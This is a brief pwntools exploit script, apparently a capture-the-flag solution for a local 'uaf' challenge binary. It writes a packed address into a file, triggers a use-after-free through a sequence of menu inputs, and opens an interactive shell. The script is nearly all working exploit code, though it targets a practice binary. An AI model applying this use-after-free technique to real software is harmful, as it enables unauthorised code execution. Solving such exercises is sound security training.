#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
context.log_level = 'debug'

#elf = ELF('./uaf')

len = '16'
sys_addr = p64(0x00401568)

f = open('addr.txt','w')
f.write(sys_addr)
f.close()

io = process( argv = ['/home/uaf//uaf',len,'addr.txt'] )

io.sendlineafter("free\n",'3')
io.sendlineafter("free\n",'2')
io.sendlineafter("free\n",'2')
io.sendlineafter("free\n",'1')

io.interactive()

